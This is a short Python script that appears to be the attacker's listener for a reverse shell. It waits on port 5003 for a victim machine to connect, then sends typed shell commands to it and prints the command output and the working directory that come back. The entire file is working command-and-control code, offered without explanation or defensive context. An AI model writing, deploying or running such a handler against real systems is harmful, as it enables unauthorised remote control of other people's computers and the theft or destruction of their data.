#Local Imports
import socket

#Server Configration
SERVER_HOST = "0.0.0.0" #Added 0.0.0.0 for all System Ip Addresses
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
server_socket = socket.socket()

# bind the socket to all IP addresses of this host
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
# accept any connections attempted
client_socket, client_address = server_socket.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
    # get the command from prompt
    command = input(f"[+] shell\\{cwd}$> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)